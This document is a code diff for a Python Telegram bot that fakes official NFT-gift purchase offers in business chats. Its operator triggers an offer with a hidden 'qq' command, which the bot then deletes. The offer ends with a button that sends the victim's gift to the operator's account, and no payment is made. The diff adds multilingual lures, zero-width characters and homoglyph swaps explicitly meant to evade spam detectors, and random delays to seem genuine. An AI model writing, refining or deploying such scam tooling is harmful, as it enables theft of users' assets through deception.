@@ -1,7 +1,10 @@
 import asyncio
+import random
+import time
 import logging
 from aiogram import Bot, Dispatcher, F
-from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
+from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, LinkPreviewOptions
+from aiogram.enums import ParseMode
 from aiogram.fsm.storage.memory import MemoryStorage
 
 # Настройки
@@ -12,184 +15,299 @@ logging.basicConfig(level=logging.INFO)
 bot = Bot(token=TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
 
-# Очередь для отправки сообщений
+# Очередь для защиты от флуда и хранилища кулдаунов / последних сообщений
 message_queue = asyncio.Queue()
+cooldowns = {}          # chat_id -> timestamp последнего запроса
+last_user_messages = {} # chat_id -> message_id последнего сообщения юзера
 
-# Текст оффера (с превью карточки сверху для любого NFT)
-def build_offer_text(sender_username, amount, gift_name, gift_num):
+# Словари локализации для офферов
+LOCALES = {
+    "ru": {
+        "offer_text": "предлагает вам",
+        "timer": "Предложение действует ещё",
+        "lock": "Сделка фиксируется кнопкой Принять",
+        "decline": "❌ Отклонить",
+        "accept": "✅ Принять",
+        "declined": "❌ Предложение отклонено.",
+        "success_title": "Коллекционный предмет",
+        "success_sold": "успешно продан!",
+        "instruction": "Передайте коллекционный предмет покупателю для зачисления",
+        "btn_transfer": "↗ Передать НФТ",
+        "btn_confirm": "⊙ Подтвердить передачу"
+    },
+    "eng": {
+        "offer_text": "offers you",
+        "timer": "Offer is valid for",
+        "lock": "The deal is fixed by clicking Accept",
+        "decline": "❌ Decline",
+        "accept": "✅ Accept",
+        "declined": "❌ Offer declined.",
+        "success_title": "Collectible item",
+        "success_sold": "successfully sold!",
+        "instruction": "Transfer the collectible item to the buyer to receive",
+        "btn_transfer": "↗ Transfer NFT",
+        "btn_confirm": "⊙ Confirm transfer"
+    },
+    "ukr": {
+        "offer_text": "пропонує вам",
+        "timer": "Пропозиція діє ще",
+        "lock": "Угода фіксується кнопкою Прийняти",
+        "decline": "❌ Відхилити",
+        "accept": "✅ Прийняти",
+        "declined": "❌ Пропозицію відхилено.",
+        "success_title": "Колекційний предмет",
+        "success_sold": "успішно продано!",
+        "instruction": "Передайте колекційний предмет покупцю для зарахування",
+        "btn_transfer": "↗ Передати НФТ",
+        "btn_confirm": "⊙ Підтвердити передачу"
+    },
+    "cn": {
+        "offer_text": "向您出价",
+        "timer": "报价有效时间",
+        "lock": "点击接受以锁定交易",
+        "decline": "❌ 拒绝",
+        "accept": "✅ 接受",
+        "declined": "❌ 报价已拒绝。",
+        "success_title": "收藏品",
+        "success_sold": "已成功售出！",
+        "instruction": "请将收藏品转移给买家以获得",
+        "btn_transfer": "↗ 转移 NFT",
+        "btn_confirm": "⊙ 确认转移"
+    }
+}
+
+# Функция добавления невидимых символов для уникальности текста
+def randomize_text(text: str) -> str:
+    invisible_chars = ["\u200b", "\u200c", "\u200d", "\u2060", "\ufeff"]
+    chars = list(text)
+    for _ in range(random.randint(3, 6)):
+        pos = random.randint(0, len(chars))
+        chars.insert(pos, random.choice(invisible_chars))
+    return "".join(chars)
+
+# Функция подмены символов (гомоглифы) для обхода детекторов
+def apply_homoglyphs(text: str) -> str:
+    homoglyph_map = {'a': 'а', 'e': 'е', 'o': 'о', 'p': 'р', 'c': 'с', 'x': 'х'}
+    if random.random() > 0.5:
+        target_char = random.choice(list(homoglyph_map.keys()))
+        if target_char in text:
+            text = text.replace(target_char, homoglyph_map[target_char], 1)
+    return text
+
+def build_offer_text(gift_name, gift_num, amount, currency_symbol, lang):
+    loc = LOCALES.get(lang, LOCALES["ru"])
     slug = gift_name.replace(" ", "")
-    return (
-        f'<b><a href="https://t.me/nft/{slug}-{gift_num}">Telegram</a></b>\n'
-        f'<b>{gift_name} #{gift_num}</b>\n\n'
-        f'Пользователь <b>{sender_username}</b> предлагает Вам '
-        f'<b>{amount} ⭐️</b> за коллекционный предмет '
-        f'<b>{gift_name} #{gift_num}</b>.\n\n'
-        f'Предложение действует еще 6 ч. 0 мин..'
+    
+    base = (
+        f'🎁 <b>{loc["success_title"]} <a href="https://t.me/nft/{slug}-{gift_num}"><b>{gift_name} #{gift_num}</b></a></b>\n\n'
+        f'Пользователь {loc["offer_text"]} <b>{amount} {currency_symbol}</b> за данный предмет.\n\n'
+        f'⏱ <i>{loc["timer"]} 5 ч. 59 мин.</i>\n'
+        f'🔒 <i>{loc["lock"]}</i>'
     )
+    return randomize_text(apply_homoglyphs(base))
 
-# Клавиатура оффера (Отклонить / Принять)
-def make_offer_keyboard(sender_username, amount, currency, gift_name, gift_num, lang):
-    cb_data = f"a|{sender_username}|{amount}|{currency}|{gift_name}|{gift_num}|{lang}"
+def make_offer_keyboard(gift_name, gift_num, amount, currency_symbol, lang):
+    loc = LOCALES.get(lang, LOCALES["ru"])
+    cb_data = f"a|{gift_name}|{gift_num}|{amount}|{currency_symbol}|{lang}"
     decline_data = f"d|{gift_num}"
     return InlineKeyboardMarkup(
         inline_keyboard=[
             [
-                InlineKeyboardButton(text="❌ Отклонить", callback_data=decline_data),
-                InlineKeyboardButton(text="✅ Принять", callback_data=cb_data)
+                InlineKeyboardButton(text=loc["decline"], callback_data=decline_data),
+                InlineKeyboardButton(text=loc["accept"], callback_data=cb_data)
             ]
         ]
     )
 
-# Текст после принятия (инструкция)
-def build_accept_text(gift_name, gift_num):
+def build_accept_text(gift_name, gift_num, currency_name, lang):
+    loc = LOCALES.get(lang, LOCALES["ru"])
     slug = gift_name.replace(" ", "")
     return (
-        f'<b><a href="https://t.me/nft/{slug}-{gift_num}">Telegram</a></b>\n'
-        f'<b>{gift_name} #{gift_num}</b>\n\n'
-        f'🎁 <b>Коллекционный предмет:\n'
-        f'<a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a> успешно продан!</b>\n\n'
-        f'• Передайте коллекционный предмет покупателю для зачисления Stars.'
+        f'🎁 <b>{loc["success_title"]}:\n'
+        f'<a href="https://t.me/nft/{slug}-{gift_num}">{gift_name}-{gift_num}</a> {loc["success_sold"]}</b>\n\n'
+        f'• {loc["instruction"]} {currency_name}.'
     )
 
-# Клавиатура после принятия (Передать НФТ / Подтвердить передачу)
-def make_accept_keyboard():
+def make_accept_keyboard(lang):
+    loc = LOCALES.get(lang, LOCALES["ru"])
     recipient = RECIPIENT.lstrip("@")
     return InlineKeyboardMarkup(
         inline_keyboard=[
-            [InlineKeyboardButton(text=" ↗  Передать НФТ", url=f"tg://send_gift?to={recipient}")],
-            [InlineKeyboardButton(text=" ⊙  Подтвердить передачу", callback_data="noop")],
+            [InlineKeyboardButton(text=loc["btn_transfer"], url=f"tg://send_gift?to={recipient}")],
+            [InlineKeyboardButton(text=loc["btn_confirm"], callback_data="noop")],
         ]
     )
 
-def unpack_offer(cb_data: str):
-    try:
-        parts = cb_data.split("|")
-        if len(parts) >= 7:
-            return parts[1], int(parts[2]), parts[3], parts[4], int(parts[5]), parts[6]
-    except Exception:
-        pass
-    return None
-
-# Команда qq: ты пишешь ее от своего лица, бот ее видит, удаляет и пришлет карточку ОТ СЕБЯ
-@dp.message(F.text & F.text.startswith("qq"))
-async def cmd_quick_offer(message: Message):
-    parts = message.text.split()
-    
-    if len(parts) < 3:
-        await message.reply(
-            "❌ Неверный формат!\n"
-            "Используй: <code>qq [ссылка_на_нфт] [сумма] [покупатель]</code>\n"
-            "Пример: <code>qq https://t.me/nft/DurovsCap-123 500 cryptan</code>"
-        )
+# Перехват команд владельца (формат: qq [ссылка] [сумма] [валюта] [язык])
+@dp.business_message(F.text)
+async def handle_business_command(message: Message):
+    if not message.text:
         return
 
-    nft_url = parts[1]
-    amount_str = parts[2]
-    sender_username = parts[3] if len(parts) > 3 else "cryptan"
+    text_clean = message.text.strip()
+    if not text_clean.lower().startswith("qq"):
+        return
+
+    chat_id = message.chat.id
+    last_user_messages[chat_id] = message.message_id
+
+    # Кулдаун 30 секунд на чат
+    current_time = time.time()
+    if chat_id in cooldowns and current_time - cooldowns[chat_id] < 30:
+        return
+
+    parts = text_clean.split()
+    if len(parts) < 3:
+        return
+
+    nft_url = next((p for p in parts if "t.me/nft/" in p), None)
+    if not nft_url:
+        return
 
     try:
+        amount_str = next((p for p in parts if p.isdigit()), "1000")
         amount = int(amount_str)
     except ValueError:
-        await message.reply("❌ Сумма должна быть числом!")
-        return
+        amount = 1000
+
+    text_lower = text_clean.lower()
+    if "gram" in text_lower:
+        currency_symbol = "💎"
+        currency_name = "Gram"
+    else:
+        currency_symbol = "⭐️"
+        currency_name = "Stars"
+
+    lang = "ru"
+    for l in ["ukr", "eng", "cn", "ru"]:
+        if l in text_lower:
+            lang = l
+            break
 
     try:
         slug_part = nft_url.split("/nft/")[-1]
         if "-" in slug_part:
             gift_name_raw, gift_num_str = slug_part.rsplit("-", 1)
             gift_num = int(gift_num_str)
-            gift_name = gift_name_raw
+            gift_name = gift_name_raw.replace("-", " ")
         else:
-            await message.reply("❌ Неверный формат ссылки NFT (нет номера через дефис)")
             return
-    except Exception as e:
-        await message.reply(f"❌ Ошибка разбора ссылки NFT: {e}")
+    except Exception:
         return
 
-    # Кладем в очередь (передаем chat_id, чтобы бот написал в этот чат от своего имени)
-    await message_queue.put((
-        message.chat.id,
-        sender_username,
-        amount,
-        "XTR",
-        gift_name,
-        gift_num,
-        "ru"
-    ))
+    cooldowns[chat_id] = current_time
 
-    # Удаляем твое сообщение с командой qq
-    try:
-        if message.business_connection_id:
-            await bot.delete_business_messages(
-                business_connection_id=message.business_connection_id,
-                message_ids=[message.message_id]
-            )
-        else:
-            await message.delete()
-    except Exception as e:
-        logging.error(f"Failed to delete command: {e}")
+    await message_queue.put({
+        "chat_id": chat_id,
+        "gift_name": gift_name,
+        "gift_num": gift_num,
+        "amount": amount,
+        "currency_symbol": currency_symbol,
+        "currency_name": currency_name,
+        "lang": lang,
+        "bcid": message.business_connection_id,
+        "cmd_message_id": message.message_id
+    })
 
 @dp.callback_query(F.data.startswith("a|"))
 async def accept_offer(cb: CallbackQuery):
-    data = unpack_offer(cb.data)
-    if not data:
+    parts = cb.data.split("|")
+    if len(parts) < 6:
         await cb.answer("Ошибка данных", show_alert=True)
         return
 
-    sender_username, amount, currency, gift_name, gift_num, lang = data
-    text = build_accept_text(gift_name, gift_num)
+    _, gift_name, gift_num_str, amount, currency_symbol, lang = parts
+    gift_num = int(gift_num_str)
+    
+    currency_name = "Gram" if currency_symbol == "💎" else "Stars"
+    text = build_accept_text(gift_name, gift_num, currency_name, lang)
+    bcid = cb.message.business_connection_id
+    chat_id = cb.message.chat.id
 
     try:
-        # Бот редактирует свое собственное сообщение на карточку с инструкцией
-        await cb.message.edit_text(
+        await bot.edit_message_text(
+            chat_id=chat_id,
+            message_id=cb.message.message_id,
             text=text,
-            reply_markup=make_accept_keyboard(),
-            disable_web_page_preview=False,
+            parse_mode=ParseMode.HTML,
+            reply_markup=make_accept_keyboard(lang),
+            business_connection_id=bcid,
+            link_preview_options=LinkPreviewOptions(is_disabled=False, show_above_text=True)
         )
     except Exception as e:
-        logging.error(f"accept error: {e}")
-        await cb.answer("Не удалось обновить", show_alert=True)
+        logging.error(f"Error editing message: {e}")
+        await cb.answer("Не удалось обновить оффер", show_alert=True)
         return
-        
+
     await cb.answer()
 
 @dp.callback_query(F.data.startswith("d|"))
 async def decline_offer(cb: CallbackQuery):
+    bcid = cb.message.business_connection_id
     try:
-        await cb.message.delete()
+        await bot.delete_business_messages(
+            business_connection_id=bcid,
+            message_ids=[cb.message.message_id]
+        )
     except Exception as e:
-        logging.error(f"decline delete error: {e}")
+        logging.error(f"Decline error: {e}")
     await cb.answer("Предложение отклонено")
 
 @dp.callback_query(F.data == "noop")
 async def noop_handler(cb: CallbackQuery):
-    await cb.answer("Выполните передачу по кнопке выше", show_alert=False)
+    await cb.answer("Сначала выполните передачу НФТ по кнопке выше!", show_alert=True)
 
-# Фоновый воркер: отправляет сообщение ОТ ИМЕНИ БОТА (без business_connection_id)
+# Фоновый воркер с рандомной задержкой
 async def sender_worker():
     while True:
         task = await message_queue.get()
-        chat_id, sender_username, amount, currency, gift_name, gift_num, lang = task
         try:
-            text = build_offer_text(sender_username, amount, gift_name, gift_num)
-            keyboard = make_offer_keyboard(sender_username, amount, currency, gift_name, gift_num, lang)
-            
-            # Шлем обычным методом, чтобы сообщение шло от имени самого бота в чат
-            await bot.send_message(
-                chat_id=chat_id,
-                text=text,
-                reply_markup=keyboard,
-                disable_web_page_preview=False,
+            await asyncio.sleep(random.uniform(0.4, 1.2))
+
+            text = build_offer_text(
+                task["gift_name"], 
+                task["gift_num"], 
+                task["amount"], 
+                task["currency_symbol"], 
+                task["lang"]
             )
+            keyboard = make_offer_keyboard(
+                task["gift_name"], 
+                task["gift_num"], 
+                task["amount"], 
+                task["currency_symbol"], 
+                task["lang"]
+            )
+
+            # 1. Отправляем оффер
+            await bot.send_message(
+                chat_id=task["chat_id"],
+                text=text,
+                parse_mode=ParseMode.HTML,
+                reply_markup=keyboard,
+                business_connection_id=task["bcid"],
+                link_preview_options=LinkPreviewOptions(is_disabled=False, show_above_text=True),
+                reply_to_message_id=last_user_messages.get(task["chat_id"])
+            )
+
+            # 2. Удаляем команду qq
+            if task["bcid"]:
+                await bot.delete_business_messages(
+                    business_connection_id=task["bcid"],
+                    message_ids=[task["cmd_message_id"]]
+                )
+
         except Exception as e:
-            logging.error(f"worker error: {e}")
+            logging.error(f"Worker execution error: {e}")
         finally:
             message_queue.task_done()
-            await asyncio.sleep(1.5)
 
 async def main():
     asyncio.create_task(sender_worker())
-    await dp.start_polling(bot)
+    await dp.start_polling(
+        bot, 
+        allowed_updates=["callback_query", "business_connection", "business_message"]
+    )
 
 if __name__ == "__main__":
     asyncio.run(main())
